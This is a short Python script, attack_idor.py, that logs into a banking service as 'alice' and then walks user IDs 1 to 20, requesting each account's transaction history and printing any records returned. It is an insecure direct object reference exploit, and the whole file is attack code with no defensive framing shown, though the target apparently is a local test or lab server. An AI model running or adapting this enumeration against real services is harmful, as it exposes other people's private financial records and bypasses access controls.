# attack_idor.py
from bank_client import BankClient

c = BankClient()
print("Login:", c.cmd("LOGIN alice qwerty"))

for uid in range(1, 21):
    resp = c.cmd(f"HISTORY {uid}")
    if resp.startswith("OK|"):
        body = resp[3:]
        n = body.count('"id"')
        if n > 0:
            print(f"  uid={uid:3} -> {n} transactions: {body[:120]}...")
        else:
            print(f"  uid={uid:3} -> empty")
    else:
        print(f"  uid={uid:3} -> {resp}")
c.close()
